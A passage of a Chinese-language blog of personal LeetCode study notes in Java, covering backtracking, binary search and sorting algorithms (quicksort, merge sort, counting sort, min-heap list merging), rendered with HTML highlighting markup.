class="type">int</span> i=start;i&lt;s.length();i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(isPara(s,start,i))&#123;</span><br><span class="line">判断回文字符串的isPara方法，是用双指针实现，通过<span class="keyword">while</span>确定左右两指针是否相遇，在这一过程对比字符。又是只击败了<span class="number">5</span>%，可能还是最后双层List&lt;List&lt;String&gt;&gt; 转 String[][]的步骤太耗费时间。</span><br><span class="line">    （关键词，先判断后递进）</span><br><span class="line"><span class="number">2.</span>双层List&lt;List&lt;String&gt;&gt; 转 String[][]，内层不定长时的coding技巧：</span><br><span class="line">    String[][] finals = <span class="keyword">new</span> <span class="title class_">String</span>[results.size()][];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;results.size();i++)&#123;</span><br><span class="line">        List&lt;String&gt; list = results.get(i);</span><br><span class="line">        finals[i] = list.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[list.size()]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="087、复原IP（93、9月20日）"><a href="#087、复原IP（93、9月20日）" class="headerlink" title="087、复原IP（93、9月20日）"></a>087、复原IP（93、9月20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，回溯法。当没有遍历到末尾，且<span class="string">&#x27;.&#x27;</span>字符数量不足<span class="number">3</span>时，对于当前字符有两种选择：</span><br><span class="line">    a.如果seg加当前字符后仍然有效，可以不创建新段，直接seg+ch，并进入下一轮dfs；</span><br><span class="line">    <span class="keyword">if</span>(isAvaliable(seg+ch))</span><br><span class="line">    b.如果<span class="string">&#x27;.&#x27;</span>字符数量小于<span class="number">3</span>，且当前段有字符，可以创建新段<span class="string">&#x27;&#x27;</span>+ch，并在ip上添加当前段seg+<span class="string">&#x27;.&#x27;</span>，再进入下一轮dfs；</span><br><span class="line"><span class="keyword">if</span>(numSplit&lt;<span class="number">3</span>&amp;&amp;seg.length()&gt;<span class="number">0</span>)</span><br><span class="line">这道题的边界条件比较复杂，比较难想到。此外，其isAvaliable方法设计很简洁，即规定范围且要满足<span class="number">0</span>的出现要求：</span><br><span class="line"><span class="keyword">return</span> Integer.parseInt(s)&lt;=<span class="number">255</span>&amp;&amp;(s.equals(<span class="string">&quot;0&quot;</span>)||s.charAt(<span class="number">0</span>)!=<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">这道题解法并没有回溯，更像是所有可能走到头的穷举。估计下次做还是做不出来hhhh</span><br><span class="line">（关键词，先判断后递进）</span><br><span class="line"><span class="number">2.</span>字符串值比较一定要用s.equals(<span class="string">&quot;0&quot;</span>)，而不是s==<span class="string">&quot;0&quot;</span>，这里s是通过<span class="string">&quot;&quot;</span>+ch不断累加得到的。</span><br></pre></td></tr></table></figure><h3 id="总结之回溯法"><a href="#总结之回溯法" class="headerlink" title="总结之回溯法"></a>总结之回溯法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>官方描述提炼：</span><br><span class="line">a.在采用回溯法解决问题时，如果到达树形结构的叶子节点，就找到了问题的一个解；</span><br><span class="line">b.如果在前往某个节点时对问题的解的状态进行了修改，那么在回溯到它的父节点时要记得清除相应的修改；</span><br><span class="line">c.如果明确知道某些子树没有必要遍历，那么在遍历的时候应该避开这些子树以优化效率，这种操作叫剪枝；</span><br><span class="line"><span class="number">2.</span>组合（子集）不看顺序，排列需要注意顺序（排列题目用swap）。</span><br><span class="line"><span class="number">3.</span>LinkedList类有removeLast方法，而ArrayList类并没有，注意多态别List。</span><br><span class="line"><span class="number">4.</span>双层List嵌套结果，需要用下面的方式放入结果。如果直接result.add(subSet)，后面再操作subSet时，会改变result中subSet值：</span><br><span class="line">result.add(<span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;(subSet));</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>回溯法dfs函数的经典结构（组合问题）：</span><br><span class="line">    <span class="keyword">if</span>(subSet.size()==k)&#123;</span><br><span class="line">            results.add(<span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;(subSet));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(start&lt;=n)&#123;</span><br><span class="line">                dfs(n,k,start+<span class="number">1</span>,subSet,results);</span><br><span class="line">                </span><br><span class="line">                subSet.add(start);</span><br><span class="line">                dfs(n,k,start+<span class="number">1</span>,subSet,results);</span><br><span class="line">                subSet.removeLast();</span><br><span class="line">            &#125;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="number">6.</span>避免重复组合的方法是，当在某一步决定跳过某个值为m的数字时，跳过所有值为m的数字。</span><br><span class="line">    <span class="type">int</span> <span class="variable">step</span> <span class="operator">=</span> index;</span><br><span class="line">    <span class="keyword">while</span>(step+<span class="number">1</span>&lt;candidates.length&amp;&amp;candidates[step+<span class="number">1</span>] == candidates[step])&#123;</span><br><span class="line">        step += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(candidates, target, step + <span class="number">1</span>, sum, subSet, results);</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>双层List&lt;List&lt;String&gt;&gt; 转 String[][]，内层不定长时的coding技巧：</span><br><span class="line">    String[][] finals = <span class="keyword">new</span> <span class="title class_">String</span>[results.size()][];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;results.size();i++)&#123;</span><br><span class="line">        List&lt;String&gt; list = results.get(i);</span><br><span class="line">        finals[i] = list.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[list.size()]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>适合回溯法的问题的一个特点是解决这个问题存在多个解，而且题目往往要求列出所有的解。</span><br></pre></td></tr></table></figure><h2 id="第十一章、二分查找"><a href="#第十一章、二分查找" class="headerlink" title="第十一章、二分查找"></a>第十一章、二分查找</h2><h3 id="068、查找插入位置（35、9月23日）"><a href="#068、查找插入位置（35、9月23日）" class="headerlink" title="068、查找插入位置（35、9月23日）"></a>068、查找插入位置（35、9月23日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，穷举。从左到右遍历数组，如果当前数字大于等于目标值，返回当前索引；否则遍历结束后，返回数组长度，即目标值应该插入有序数组的最后一位。（关键词，穷举）</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，二分查找。经典的二分查找代码，维护left和right双指针，当left&lt;=right时，每轮取中间与目标值比较，根据大小关系决定移动哪个指针，下一轮遍历哪半部分。其中，left等于right是因为，长度为<span class="number">1</span>的子数组也是有效范围。</span><br><span class="line">    稍有不同的是，指针越界则返回left指针，说明上一轮指针重合，target恰好介于二者之间。</span><br></pre></td></tr></table></figure><h3 id="069、山峰数组的顶部（852、9月23日）"><a href="#069、山峰数组的顶部（852、9月23日）" class="headerlink" title="069、山峰数组的顶部（852、9月23日）"></a>069、山峰数组的顶部（852、9月23日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，穷举+标志位。维护一个整型标志位flagIndex，记录山峰位置索引。从索引<span class="number">1</span>开始，从左到右遍历数组，如果当前值大于上一个值，就更新flagIndex，否则跳出循环，返回结果flagIndex。本题简单是因为输入是标准的山峰数组。（关键词，标志位）</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，二分查找。经典二分查找代码，但不知道如何维护边界。因为山峰的范围在[<span class="number">1</span>,length-<span class="number">2</span>]，故左指针从<span class="number">1</span>开始，右指针从（length-<span class="number">1</span>）开始，其他不变。（关键词，山峰边界）</span><br></pre></td></tr></table></figure><h3 id="070、排序数组中只出现一次的数字（540、9月23日）"><a href="#070、排序数组中只出现一次的数字（540、9月23日）" class="headerlink" title="070、排序数组中只出现一次的数字（540、9月23日）"></a>070、排序数组中只出现一次的数字（540、9月23日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，穷举+标志位。维护一个整型标志位flag，记录当前遍历节点。因为是有序列表，如果本元素和前元素相等，就将flag恢复为Integer.MIN_VALUE，如果不相等，则返回上一元素。遍历到新数字时，如果flag等于Integer.MIN_VALUE，说明前两元素相等并清空了flag，这时候要将flag设置为本数字，避免本数字为最后的数字。（关键词，标志位）</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，二分查找。对于<span class="number">3</span>前面的每个数对如(<span class="number">1</span>,<span class="number">1</span>)，第一个数是偶数；对于<span class="number">3</span>后面的每个数对如(<span class="number">4</span>,<span class="number">4</span>)，第一个数是奇数。因此，每次取到偶数mid时，如果nums[mid] == nums[mid + <span class="number">1</span>]说明mid是在<span class="number">3</span>之前，就移动左指针到mid+<span class="number">2</span>（下一个偶数），反之移动右指针到mid。（关键词，索引奇偶性找规律）</span><br><span class="line">[<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>]</span><br><span class="line">    [偶,奇,偶,奇,偶,奇,偶,奇,偶]</span><br><span class="line">    （二分查找看了几遍，没做出来）</span><br></pre></td></tr></table></figure><h3 id="071、按权重生成随机数（528、9月26日）"><a href="#071、按权重生成随机数（528、9月26日）" class="headerlink" title="071、按权重生成随机数（528、9月26日）"></a>071、按权重生成随机数（528、9月26日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，前缀和+二分查找。这道题要求按权重获取随机数，题解思路的精妙之处，在于维护一个前缀和数组，比如权重[<span class="number">4</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>]，维护一个前缀和数组[<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">12</span>],从[<span class="number">1</span>,<span class="number">12</span>]的范围里通过random API平均取随机数，如果取到<span class="number">9</span>，就对应取到前缀和数组中的索引<span class="number">3</span>，这样就实现了下标按权重随机获取。Solution构造方法初始化前缀和数组，pickIndex方法[<span class="number">0</span>,权重总和]随机获取值后，在前缀和数组里二分查找获取索引。</span><br><span class="line">    （关键词，前缀和数组）</span><br><span class="line"><span class="number">2.</span>本题数组中存着前缀和，因此要在[<span class="number">1</span>,total]中随机取值</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Random</span>.nextInt(total);  <span class="comment">//在[0,total-1]中随机取值</span></span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Random</span>.nextInt(total)+<span class="number">1</span>;  <span class="comment">//在[1,total]中随机取值</span></span><br></pre></td></tr></table></figure><h3 id="072、求平方根（69、9月25日）"><a href="#072、求平方根（69、9月25日）" class="headerlink" title="072、求平方根（69、9月25日）"></a>072、求平方根（69、9月25日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，二分查找。每次取left、right指针的中间，如果mid*mid小于目标值，移动左指针到(mid-<span class="number">1</span>)，否则移动右指针到(mid+<span class="number">1</span>)。注意，判断条件left&lt;=right，这样如果目标值为<span class="number">0</span>就能处理。结果返回(left-<span class="number">1</span>)，因为mid才是平方恰小于目标值的数。（关键词，二分查找）</span><br><span class="line">    还需要<span class="type">long</span>来处理一些特别的测试用例。</span><br></pre></td></tr></table></figure><h3 id="073、狒狒吃香蕉（875、9月26日）"><a href="#073、狒狒吃香蕉（875、9月26日）" class="headerlink" title="073、狒狒吃香蕉（875、9月26日）"></a>073、狒狒吃香蕉（875、9月26日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，二分查找。没想到这样的题也能用二分查找，首先是在给定速度speed下时间的计算公式：</span><br><span class="line"><span class="type">int</span> <span class="variable">curTime</span> <span class="operator">=</span> (pile+speed-<span class="number">1</span>)/speed;</span><br><span class="line">time += curTime;</span><br><span class="line">这道题的思路就是，在最低、最高速度范围内，通过二分查找选出速度，并计算时间，如果时间低于目标值，就减小速度的最高界，反之增加速度的最低界。根据题解，狒狒吃香蕉速度最低每小时<span class="number">1</span>根，最高每小时最大堆根，因此将left、right指针分别指向<span class="number">0</span>和max，在二分查找时更新left、right指针，并更新获得的最低速度。</span><br><span class="line">    （关键词，二分查找速度+计算时间再判断）</span><br></pre></td></tr></table></figure><h3 id="总结之二分查找"><a href="#总结之二分查找" class="headerlink" title="总结之二分查找"></a>总结之二分查找</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>在一个长度为n的数组中查找一个数字，从左到右遍历的话需要O(n)的时间；如果数组是排序的（通常递增），那么可以采用二分查找进行优化。二分查找步骤如下：</span><br><span class="line">取出位于数组中间的数字和目标数字比较，如果中间数字大于目标数字，那么只需要查找数组的前半部分，没必要再看后半部分。</span><br><span class="line"><span class="number">2.</span>经典二分查找代码：（关键词，left和right双指针，每轮取中间）</span><br><span class="line">    经典的二分查找代码，维护left和right双指针，当left&lt;=right时，每轮取中间与目标值比较，根据大小关系决定移动哪个指针，下一轮遍历哪半部分。其中，left等于right是因为，长度为<span class="number">1</span>的子数组也是有效范围。</span><br><span class="line"><span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid]==target)</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; target)</span><br><span class="line">            right = mid-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            left = mid+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> left;  <span class="comment">//如果找不到则返回比target大的后一位</span></span><br><span class="line"><span class="number">3.</span>Random API复制记录：</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Random</span>.nextInt(total);  <span class="comment">//在[0,total-1]中随机取值</span></span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Random</span>.nextInt(total)+<span class="number">1</span>;  <span class="comment">//在[1,total]中随机取值</span></span><br></pre></td></tr></table></figure><h2 id="第十二章、排序"><a href="#第十二章、排序" class="headerlink" title="第十二章、排序"></a>第十二章、排序</h2><h3 id="074、合并区间（56、9月26日）"><a href="#074、合并区间（56、9月26日）" class="headerlink" title="074、合并区间（56、9月26日）"></a>074、合并区间（56、9月26日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，先排序再比较。先将二维数组内层根据start从小到达排序，这时候就可比较相邻数组的end。这里使用双重<span class="keyword">while</span>控制，对于内层<span class="keyword">while</span>，如果遍历到的新数组start仍小于临时数组的end，就将新数组范围添加到临时数组（即更新临时数组end），直到某新数组不符合要求，则将临时数组添加到结果集中，在当前遍历点开始新一轮外层循环。</span><br><span class="line">    （关键词，排序后双<span class="keyword">while</span>）</span><br><span class="line"><span class="number">2.</span>数组操作相关api：</span><br><span class="line">    Arrays.sort(intervals,(<span class="type">int</span>[] e1,<span class="type">int</span>[] e2)-&gt;e1[<span class="number">0</span>]-e2[<span class="number">0</span>]);  <span class="comment">//将二维数组intervals中的数组，按照索引0位置大小排序</span></span><br><span class="line"><span class="comment">//将List转换为二维数组，需要先定义有外层初值的二维数组resultArray，再调用toArray API</span></span><br><span class="line">List&lt;<span class="type">int</span>[]&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"><span class="type">int</span>[][] resultArray = <span class="keyword">new</span> <span class="title class_">int</span>[result.size()][];</span><br><span class="line">resultArray = result.toArray(resultArray);</span><br></pre></td></tr></table></figure><h3 id="075、数组相对排序（1122、9月27日）"><a href="#075、数组相对排序（1122、9月27日）" class="headerlink" title="075、数组相对排序（1122、9月27日）"></a>075、数组相对排序（1122、9月27日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>计数排序：如果数组长度为n，整数范围（最大整数和最小整数的差值）为k，对于k远小于n的场景，计数排序的时间复杂度优于其他基于比较的排序算法（如归并排序，快速排序等）。计数排序的基本思想是，先统计数组中每个整数在数组中出现的次数，然后按照从小到大的顺序将每个整数按照它出现的次数填到数组中。</span><br><span class="line">    即先根据输入的极值为每个可能的位置挖好坑（辅助数组），再遍历数组将每个位置的次数输入辅助数组，最后按顺序遍历辅助数组即可得到有序的结果。时间复杂度O(n+k)，空间复杂度O(k)。（关键词，counts数组）</span><br><span class="line">    <span class="comment">//计数排序</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sortArray(<span class="type">int</span>[] nums)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Integer.MIN_VALUE;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;</span><br><span class="line">            min = Math.min(min,num);</span><br><span class="line">            max = Math.max(max,num);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span>[] counts = <span class="keyword">new</span> <span class="title class_">int</span>[max-min+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;</span><br><span class="line">            counts[num-min]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num=min;num&lt;=max;num++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(counts[num-min]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                nums[i++] = num;</span><br><span class="line">                counts[num-min] -- ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，计数排序。题目提示<span class="number">0</span> &lt;= arr1[i], arr2[i] &lt;= <span class="number">1000</span>，给出了数字范围k，是可以用计数排序的提示。先定义counts数组为<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1001</span>]，将arr1数组中每个数字的次数填入counts数组的对应索引位置，遍历arr2数组将counts数组对应数字依次取出，再将counts数组剩余元素依次取出，即可得到有序结果。（关键词，arr1放入counts[<span class="number">1001</span>]）</span><br></pre></td></tr></table></figure><h3 id="076、数组中的第k大的数字（215、9月27日）"><a href="#076、数组中的第k大的数字（215、9月27日）" class="headerlink" title="076、数组中的第k大的数字（215、9月27日）"></a>076、数组中的第k大的数字（215、9月27日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>快速排序：快速排序的基本思想是分治法，排序过程如下：在输入数组中随机选取一个元素作为中间值（pivot），然后对数组进行分区（partition），使所有比中间值小的数据移动到数组的左边，所有比中间值大的数据移动到数组的右边。接下来对两侧的子数组用相同的步骤排序，直到子数组只有一个数字为止。（关键词，随机获取中间值+small指针交换）</span><br><span class="line"><span class="comment">//快速排序</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sortArray_quick(<span class="type">int</span>[] nums)&#123;</span><br><span class="line">        quicksort(nums,<span class="number">0</span>, nums.length-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">quicksort</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> start,<span class="type">int</span> end)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(end&gt;start)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">pivot</span> <span class="operator">=</span> partition(nums,start,end);</span><br><span class="line">            quicksort(nums,start,pivot-<span class="number">1</span>);</span><br><span class="line">            quicksort(nums,pivot+<span class="number">1</span>,end);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//small指针始终指向已经发现的最后一个小于中间值的数字</span></span><br><span class="line"><span class="comment">//即对于某一子数组，从左到右遍历时，如果发现nums[i]小于中间值，就和small指针位置的数字交换；介于small到i的数字，都是比中间值要大的数字，当i到达end时，将small指针位置数字和end交换，就使得大于中间值的数字放在了右边。</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">partition</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> start,<span class="type">int</span> end)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(end-start+<span class="number">1</span>)+start;</span><br><span class="line">        swap(nums,random,end);</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">small</span> <span class="operator">=</span> start - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=start;i&lt;end;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]&lt;nums[end])&#123;</span><br><span class="line">                small++;</span><br><span class="line">                swap(nums,i,small);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        small++;</span><br><span class="line">        swap(nums,small,end);</span><br><span class="line">        <span class="comment">//不是返回random，而是返回small，观察两次交换，random位置的值先到end，再到了small</span></span><br><span class="line">        <span class="keyword">return</span> small;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> index1,<span class="type">int</span> index2)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index1!=index2)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[index1];</span><br><span class="line">            nums[index1] = nums[index2];</span><br><span class="line">            nums[index2] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，快速排序+二分查找。先通过partition方法获取确定的中间值索引index，如果index小于目标索引位置，说明需要在右侧子数组中继续寻找，将二分查找的left指针指向index+<span class="number">1</span>；如果index大于目标索引位置，说明需要在左侧子数组中继续寻找，将二分查找的right指针指向index-<span class="number">1</span>；并继续递归调用partition方法，直到撞出目标索引位置后返回。（关键词，快排+二分查找）</span><br></pre></td></tr></table></figure><h3 id="077、链表排序（148、9月27日）"><a href="#077、链表排序（148、9月27日）" class="headerlink" title="077、链表排序（148、9月27日）"></a>077、链表排序（148、9月27日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>归并排序：归并排序也是一种基于分治法的排序算法，为了排序长度为n的数组，需要先排序两个长度为n/<span class="number">2</span>的子数组，然后合并两个排序的子数组。示例：  需要维护两个数组来回倒腾（关键词，子数组翻倍排序）</span><br><span class="line">    [<span class="number">4</span>,<span class="number">1</span>, <span class="number">5</span>,<span class="number">6</span>, <span class="number">2</span>,<span class="number">7</span>, <span class="number">8</span>,<span class="number">3</span>]</span><br><span class="line">  -&gt;[<span class="number">1</span>,<span class="number">4</span>, <span class="number">5</span>,<span class="number">6</span>, <span class="number">2</span>,<span class="number">7</span>, <span class="number">3</span>,<span class="number">8</span>]</span><br><span class="line">  -&gt;[<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>    <span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">8</span>]</span><br><span class="line">  -&gt;[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>   ]</span><br><span class="line"><span class="comment">//归并排序 非递归实现</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sortArray_guibing(<span class="type">int</span>[] nums)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] src = nums;</span><br><span class="line">        <span class="type">int</span>[] dst = <span class="keyword">new</span> <span class="title class_">int</span>[length];</span><br><span class="line">    <span class="comment">//外层遍历每次翻倍合并两个数组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> seg=<span class="number">1</span>;seg&lt;length;seg+=seg)&#123;</span><br><span class="line">            <span class="comment">//内层遍历从左到右，合并排序2*seg范围里的两个有序子数组，</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> start=<span class="number">0</span>;start&lt;length;start+=seg*<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> Math.min(start+seg, length);</span><br><span class="line">                <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> Math.min(start+seg*<span class="number">2</span>,length);</span><br><span class="line">                <span class="type">int</span> i=start,j=mid,k=start;</span><br><span class="line">                <span class="keyword">while</span>(i&lt;mid||j&lt;end)&#123;</span><br><span class="line">                    <span class="comment">//靠右的子数组可能先结束，如果其提前结束，就只选取前一数组的值</span></span><br><span class="line">                    <span class="keyword">if</span>(j == end||(i&lt;mid&amp;&amp;src[i]&lt;src[j]))&#123;</span><br><span class="line">                        dst[k++] = src[i++];</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        dst[k++] = src[j++];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//交换src和temp，屠龙勇士终成龙</span></span><br><span class="line">            <span class="type">int</span>[] temp = src;</span><br><span class="line">            src = dst;</span><br><span class="line">            dst = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> src;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//归并排序 递归实现</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sortArray_guibing2(<span class="type">int</span>[] nums)&#123;</span><br><span class="line">        <span class="type">int</span>[] dst = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line">        dst = Arrays.copyOf(nums,nums.length);</span><br><span class="line">        mergeSort(nums,dst,<span class="number">0</span>,nums.length);</span><br><span class="line">        <span class="keyword">return</span> dst;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">mergeSort</span><span class="params">(<span class="type">int</span>[] src,<span class="type">int</span>[] dst,<span class="type">int</span> start,<span class="type">int</span> end)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(start+<span class="number">1</span>&gt;=end)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (start+end)/<span class="number">2</span>;</span><br><span class="line">        mergeSort(dst,src,start,mid);</span><br><span class="line">        mergeSort(dst,src,mid,end);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start,j = mid,k = start;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;mid||j&lt;end)&#123;</span><br><span class="line">            <span class="keyword">if</span>(j == end||(i&lt;mid&amp;&amp;src[i]&lt;src[j]))&#123;</span><br><span class="line">                dst[k++] = src[i++];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dst[k++] = src[j++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，归并排序。最近有点急火攻心，感冒了也迷茫了，在不知道的位置滚雪球，真的是在前进吗？总体结构如下代码，先通过split方法（快慢指针）获取链表的中间位置并切开，递归调用sortList将两边排序好后，再用merge方法组合两个链表。在merge方法中，因为传入两个链表的目的就是合并，因此可以移动两个链表的头指针，比较两个头指针大小后接到新链表cur上。</span><br><span class="line">    （关键词，快慢指针切开+归并排序）</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">sortList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">null</span>||head.next==<span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">head1</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">head2</span> <span class="operator">=</span> split(head);</span><br><span class="line">        </span><br><span class="line">        head1 = sortList(head1);</span><br><span class="line">        head2 = sortList(head2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> merge(head1,head2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="078、合并排序链表（23、9月27日）"><a href="#078、合并排序链表（23、9月27日）" class="headerlink" title="078、合并排序链表（23、9月27日）"></a>078、合并排序链表（23、9月27日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，最小堆。定义PriorityQueue如下，首先将每个链表的表头放入minHeap，由于是最小堆，此时poll操作获取值最小的节点，先将该节点链入新列表，再将其next指针指向的节点再放入minHeap，重复次操作直到最小堆为空。</span><br><span class="line">PriorityQueue&lt;ListNode&gt; minHeap = <span class="keyword">new</span> <span class="title 